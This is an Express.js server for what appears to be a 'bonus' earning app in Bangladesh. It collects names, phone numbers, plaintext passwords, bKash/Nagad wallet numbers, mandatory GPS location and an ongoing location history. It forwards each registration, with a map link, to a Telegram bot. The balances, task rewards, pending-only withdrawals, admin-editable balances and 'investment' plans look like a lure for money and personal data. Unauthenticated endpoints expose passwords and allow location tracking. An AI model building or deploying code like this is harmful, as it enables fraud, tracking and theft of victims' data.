const express = require("express");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
require("dotenv").config();

const app = express();
const PORT = Number(process.env.PORT || 3000);

const ADMIN_PIN = String(process.env.ADMIN_PIN || "6123");
const APP_SECRET = String(process.env.APP_SECRET || "change-this-secret-now");

if (process.env.NODE_ENV === "production") {
  if (ADMIN_PIN === "6123") console.warn("⚠️ WARNING: Using default ADMIN_PIN in production!");
  if (APP_SECRET === "change-this-secret-now") console.warn("⚠️ WARNING: Using default APP_SECRET in production!");
}

const DATA_DIR = path.join(__dirname, "data");
const DB_FILE = path.join(DATA_DIR, "db.json");

fs.mkdirSync(DATA_DIR, { recursive: true });

let fileLockPromise = Promise.resolve();
function withFileLock(operation) {
  const result = fileLockPromise.then(() => operation());
  fileLockPromise = result.catch(() => {});
  return result;
}

function defaultDb() {
  return {
    registrations: [],
    usedNumbers: [],
    withdrawals: [],
    investments: [],
    settings: { telegramChatId: "", telegramBotTokenEncrypted: "" },
    tasks: [
      { id: "task_1", title: "Daily Check-in", reward: 20, type: "daily" },
      { id: "task_2", title: "Referral Bonus", reward: 50, type: "referral" },
      { id: "task_3", title: "Visit Promo Link", reward: 30, type: "visit" }
    ]
  };
}

function loadDb() {
  try {
    if (!fs.existsSync(DB_FILE)) {
      const db = defaultDb();
      fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
      return db;
    }
    const parsed = JSON.parse(fs.readFileSync(DB_FILE, "utf8"));
    return {
      registrations: Array.isArray(parsed.registrations) ? parsed.registrations : [],
      usedNumbers: Array.isArray(parsed.usedNumbers) ? parsed.usedNumbers : [],
      withdrawals: Array.isArray(parsed.withdrawals) ? parsed.withdrawals : [],
      investments: Array.isArray(parsed.investments) ? parsed.investments : [],
      settings: {
        telegramChatId: parsed.settings?.telegramChatId || "",
        telegramBotTokenEncrypted: parsed.settings?.telegramBotTokenEncrypted || ""
      },
      tasks: Array.isArray(parsed.tasks) ? parsed.tasks : defaultDb().tasks
    };
  } catch {
    return defaultDb();
  }
}

function saveDb(db) {
  const tmp = DB_FILE + ".tmp";
  fs.writeFileSync(tmp, JSON.stringify(db, null, 2));
  fs.renameSync(tmp, DB_FILE);
}

function validPhone(v) {
  return /^01[3-9]\d{8}$/.test(String(v || ""));
}

function clean(v, max = 200) {
  return String(v || "").trim().slice(0, max);
}

function key() {
  return crypto.createHash("sha256").update(APP_SECRET).digest();
}

function encryptSecret(value) {
  if (!value) return "";
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv("aes-256-gcm", key(), iv);
  const enc = Buffer.concat([cipher.update(String(value), "utf8"), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, enc]).toString("base64");
}

function decryptSecret(value) {
  if (!value) return "";
  try {
    const raw = Buffer.from(value, "base64");
    const iv = raw.subarray(0, 12);
    const tag = raw.subarray(12, 28);
    const data = raw.subarray(28);
    const decipher = crypto.createDecipheriv("aes-256-gcm", key(), iv);
    decipher.setAuthTag(tag);
    return Buffer.concat([decipher.update(data), decipher.final()]).toString("utf8");
  } catch {
    return "";
  }
}

function signSession(payload) {
  const body = Buffer.from(JSON.stringify(payload)).toString("base64url");
  const sig = crypto.createHmac("sha256", APP_SECRET).update(body).digest("base64url");
  return `${body}.${sig}`;
}

function verifySession(token) {
  try {
    const [body, sig] = String(token || "").split(".");
    if (!body || !sig) return null;
    const expected = crypto.createHmac("sha256", APP_SECRET).update(body).digest("base64url");
    const a = Buffer.from(sig), b = Buffer.from(expected);
    if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return null;
    const payload = JSON.parse(Buffer.from(body, "base64url").toString("utf8"));
    if (!payload.exp || Date.now() > payload.exp) return null;
    return payload;
  } catch {
    return null;
  }
}

function cookies(req) {
  const out = {};
  const raw = req.headers.cookie || "";
  for (const part of raw.split(";")) {
    const i = part.indexOf("=");
    if (i > -1) {
      out[part.slice(0, i).trim()] = decodeURIComponent(part.slice(i + 1).trim());
    }
  }
  return out;
}

function requireAdmin(req, res, next) {
  const session = verifySession(cookies(req).admin_session);
  if (!session || session.role !== "admin") {
    return res.status(401).json({ error: "Unauthorized" });
  }
  next();
}

function isNumberUsed(db, num) {
  if (!num) return false;
  if (db.usedNumbers.includes(num)) return true;
  return db.registrations.some(r => r.phone === num || r.paymentNumber === num);
}

async function sendTelegram(text) {
  const db = loadDb();
  const token = decryptSecret(db.settings.telegramBotTokenEncrypted);
  const chatId = db.settings.telegramChatId;

  if (!token || !chatId) return { ok: false, skipped: true, error: "Telegram Config Missing" };

  try {
    const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true })
    });

    const data = await resp.json().catch(() => ({}));
    if (!resp.ok || !data.ok) {
      return { ok: false, error: data.description || "Telegram send failed" };
    }
    return { ok: true };
  } catch (err) {
    return { ok: false, error: err.message };
  }
}

const loginAttempts = new Map();
function rateLimitAdminLogin(req, res, next) {
  const ip = req.ip || req.headers['x-forwarded-for'] || 'global';
  const now = Date.now();
  const record = loginAttempts.get(ip) || { count: 0, lockUntil: 0 };

  if (now < record.lockUntil) {
    const waitSec = Math.ceil((record.lockUntil - now) / 1000);
    return res.status(429).json({ error: `অনেকবার ভুল চেষ্টা করা হয়েছে। ${waitSec} সেকেন্ড পর আবার চেষ্টা করুন।` });
  }

  req.adminRateLimit = {
    success: () => loginAttempts.delete(ip),
    fail: () => {
      record.count += 1;
      if (record.count >= 5) {
        record.lockUntil = now + 15 * 60 * 1000;
        record.count = 0;
      }
      loginAttempts.set(ip, record);
    }
  };
  next();
}

app.use(express.json({ limit: "100kb" }));
app.use(express.static(path.join(__dirname, "public")));

// 1. User Registration Route
app.post("/api/register/start", (req, res) => {
  withFileLock(async () => {
    const name = clean(req.body?.name, 80);
    const phone = clean(req.body?.phone, 20);
    const password = clean(req.body?.password, 50);
    const age = Number(req.body?.age);
    const lat = Number(req.body?.location?.latitude);
    const lon = Number(req.body?.location?.longitude);
    const acc = Number(req.body?.location?.accuracy);

    if (name.length < 2) return res.status(400).json({ error: "সঠিক নাম দিন।" });
    if (!validPhone(phone)) return res.status(400).json({ error: "সঠিক মোবাইল নাম্বার দিন।" });
    if (!password || password.length < 4) return res.status(400).json({ error: "কমপক্ষে ৪ ডিজিটের পাসওয়ার্ড দিন।" });
    if (!Number.isFinite(age) || age < 18 || age > 100) return res.status(400).json({ error: "সঠিক বয়স দিন।" });
    if (!Number.isFinite(lat) || !Number.isFinite(lon)) {
      return res.status(400).json({ error: "দয়া করে লোকেশন অন করুন" });
    }

    const db = loadDb();
    if (isNumberUsed(db, phone)) {
      return res.status(409).json({ error: "এই নাম্বারটি দিয়ে পূর্বে রেজিস্ট্রেশন করা হয়েছে।" });
    }

    const id = crypto.randomUUID();
    const createdAt = new Date().toISOString();

    const userObj = {
      id,
      name,
      phone,
      password,
      age,
      balance: 100, // একাউন্ট খুললেই ১০০ টাকা বোনাস
      location: { latitude: lat, longitude: lon, accuracy: acc || null, capturedAt: createdAt },
      locationHistory: [{ latitude: lat, longitude: lon, accuracy: acc || null, capturedAt: createdAt }],
      completedTasks: [],
      paymentMethod: "",
      paymentNumber: "",
      status: "awaiting_payment",
      createdAt,
      updatedAt: createdAt
    };

    db.registrations.unshift(userObj);
    saveDb(db);
    res.json({ ok: true, user: userObj });
  });
});

// 2. User Login Route
app.post("/api/login", (req, res) => {
  const phone = clean(req.body?.phone, 20);
  const password = clean(req.body?.password, 50);

  const db = loadDb();
  const user = db.registrations.find(r => r.phone === phone && r.password === password);

  if (!user) {
    return res.status(401).json({ error: "মোবাইল নাম্বার বা পাসওয়ার্ড ভুল।" });
  }

  res.json({ ok: true, user });
});

app.get("/api/user/:id", (req, res) => {
  const db = loadDb();
  const user = db.registrations.find(r => r.id === req.params.id);
  if (!user) return res.status(404).json({ error: "User not found" });
  res.json({ ok: true, user });
});

// 3. Live Location Stream Update API Endpoint
app.post("/api/user/:id/location", (req, res) => {
  withFileLock(async () => {
    const lat = Number(req.body?.location?.latitude);
    const lon = Number(req.body?.location?.longitude);
    const acc = Number(req.body?.location?.accuracy);

    if (!Number.isFinite(lat) || !Number.isFinite(lon)) {
      return res.status(400).json({ error: "Invalid coordinates" });
    }

    const db = loadDb();
    const user = db.registrations.find(r => r.id === req.params.id);
    if (!user) return res.status(404).json({ error: "User not found" });

    const capturedAt = new Date().toISOString();
    const locObj = { latitude: lat, longitude: lon, accuracy: Number.isFinite(acc) ? acc : null, capturedAt };

    user.location = locObj;
    if (!Array.isArray(user.locationHistory)) user.locationHistory = [];
    user.locationHistory.push(locObj);
    user.updatedAt = capturedAt;

    saveDb(db);
    res.json({ ok: true });
  });
});

// 4. Payment Step Route
app.post("/api/register/:id/payment", (req, res) => {
  withFileLock(async () => {
    const method = clean(req.body?.paymentMethod, 20);
    const number = clean(req.body?.paymentNumber, 20);

    if (!["bKash", "Nagad"].includes(method)) {
      return res.status(400).json({ error: "bKash অথবা Nagad নির্বাচন করুন।" });
    }
    if (!validPhone(number)) {
      return res.status(400).json({ error: "সঠিক bKash/Nagad নাম্বার দিন।" });
    }

    const db = loadDb();
    const row = db.registrations.find(r => r.id === req.params.id);
    if (!row) return res.status(404).json({ error: "রেজিস্ট্রেশন সেশন পাওয়া যায়নি।" });

    if (isNumberUsed(db, number) && row.phone !== number) {
      return res.status(409).json({ error: "এই bKash/Nagad নাম্বারটি সিস্টেমে ব্যবহৃত হয়েছে।" });
    }

    row.paymentMethod = method;
    row.paymentNumber = number;
    row.status = "complete";
    row.updatedAt = new Date().toISOString();

    saveDb(db);

    const msg = [
      "✅ New Bonus Registration",
      `Name: ${row.name}`,
      `Phone: ${row.phone}`,
      `Age: ${row.age}`,
      `Payment: ${row.paymentMethod}`,
      `Wallet: ${row.paymentNumber}`,
      `Balance: ৳${row.balance}`,
      `Location: https://maps.google.com/?q=${row.location.latitude},${row.location.longitude}`,
      `Time: ${row.createdAt}`
    ].join("\n");

    const tgRes = await sendTelegram(msg);

    res.json({
      ok: true,
      user: row,
      telegramWarning: !tgRes.ok ? "Telegram Notification Failed" : null
    });
  });
});

// 5. Tasks & Reward System APIs
app.get("/api/tasks", (req, res) => {
  const db = loadDb();
  res.json({ tasks: db.tasks });
});

app.post("/api/tasks/claim", (req, res) => {
  withFileLock(async () => {
    const { userId, taskId } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);
    const task = db.tasks.find(t => t.id === taskId);

    if (!user || !task) return res.status(400).json({ error: "Invalid Request" });

    if (!Array.isArray(user.completedTasks)) user.completedTasks = [];
    const today = new Date().toISOString().split("T")[0];

    if (task.type === "daily" && user.completedTasks.some(ct => ct.taskId === taskId && ct.date === today)) {
      return res.status(400).json({ error: "আজকের ডেইলি টাস্ক ইতিমধ্যে সম্পন্ন করেছেন।" });
    }

    user.completedTasks.push({ taskId, date: today });
    user.balance = (user.balance || 0) + task.reward;

    saveDb(db);
    res.json({ ok: true, balance: user.balance, reward: task.reward });
  });
});

// 6. Withdraw & Investment System APIs
app.post("/api/withdraw", (req, res) => {
  withFileLock(async () => {
    const { userId, method, number, amount } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);

    if (!user) return res.status(404).json({ error: "User not found" });
    if (Number(amount) > user.balance || Number(amount) < 500) {
      return res.status(400).json({ error: "সর্বনিম্ন উইথড্র ৳৫০০ এবং পর্যাপ্ত ব্যালেন্স থাকতে হবে।" });
    }

    user.balance -= Number(amount);
    db.withdrawals.unshift({
      id: crypto.randomUUID(),
      userId,
      userName: user.name,
      userPhone: user.phone,
      method,
      number,
      amount: Number(amount),
      status: "Pending",
      createdAt: new Date().toISOString()
    });

    saveDb(db);
    res.json({ ok: true, balance: user.balance });
  });
});

app.post("/api/invest", (req, res) => {
  withFileLock(async () => {
    const { userId, planDays, profitPercent, amount } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);

    if (!user || Number(amount) > user.balance || Number(amount) < 100) {
      return res.status(400).json({ error: "পর্যাপ্ত ব্যালেন্স নেই (সর্বনিম্ন ইনভেস্ট ৳১০০)" });
    }

    user.balance -= Number(amount);
    db.investments.unshift({
      id: crypto.randomUUID(),
      userId,
      planDays,
      profitPercent,
      amount: Number(amount),
      status: "Active",
      createdAt: new Date().toISOString()
    });

    saveDb(db);
    res.json({ ok: true, balance: user.balance });
  });
});

// 7. Admin Control & Management APIs
app.post("/api/admin/login", rateLimitAdminLogin, (req, res) => {
  if (String(req.body?.pin || "") !== ADMIN_PIN) {
    req.adminRateLimit.fail();
    return res.status(401).json({ error: "ভুল PIN" });
  }

  req.adminRateLimit.success();
  const token = signSession({ role: "admin", exp: Date.now() + 8 * 60 * 60 * 1000 });
  const isHttps = req.secure || req.headers['x-forwarded-proto'] === 'https';

  res.setHeader(
    "Set-Cookie",
    `admin_session=${encodeURIComponent(token)}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${8 * 60 * 60}${isHttps ? '; Secure' : ''}`
  );

  res.json({ ok: true });
});

app.post("/api/admin/logout", requireAdmin, (req, res) => {
  res.setHeader("Set-Cookie", "admin_session=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0");
  res.json({ ok: true });
});

app.get("/api/admin/registrations", requireAdmin, (req, res) => {
  const db = loadDb();
  res.json({
    registrations: db.registrations,
    withdrawals: db.withdrawals,
    investments: db.investments,
    total: db.registrations.length
  });
});

app.delete("/api/admin/registrations/:id", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const db = loadDb();
    const row = db.registrations.find(r => r.id === req.params.id);
    if (row) {
      if (row.phone) db.usedNumbers.push(row.phone);
      if (row.paymentNumber) db.usedNumbers.push(row.paymentNumber);
    }
    db.registrations = db.registrations.filter(r => r.id !== req.params.id);
    saveDb(db);
    res.json({ ok: true });
  });
});

// Admin User Balance Edit System
app.post("/api/admin/user/update-balance", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const { userId, newBalance } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);
    if (user) {
      user.balance = Number(newBalance);
      saveDb(db);
      return res.json({ ok: true });
    }
    res.status(404).json({ error: "User not found" });
  });
});

app.get("/api/admin/settings", requireAdmin, (req, res) => {
  const db = loadDb();
  res.json({
    telegramChatId: db.settings.telegramChatId || "",
    hasTelegramBotToken: Boolean(db.settings.telegramBotTokenEncrypted)
  });
});

app.post("/api/admin/settings", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const db = loadDb();
    const chatId = clean(req.body?.telegramChatId, 100);
    const token = clean(req.body?.telegramBotToken, 300);

    db.settings.telegramChatId = chatId;
    if (token) {
      db.settings.telegramBotTokenEncrypted = encryptSecret(token);
    }

    saveDb(db);
    res.json({ ok: true, hasTelegramBotToken: Boolean(db.settings.telegramBotTokenEncrypted) });
  });
});

app.post("/api/admin/telegram/test", requireAdmin, async (req, res) => {
  const result = await sendTelegram("🔔 Test Message: Telegram Integration Successfully Configured!");
  if (!result.ok) {
    return res.status(400).json({ error: result.error || "Telegram message send failed" });
  }
  res.json({ ok: true });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
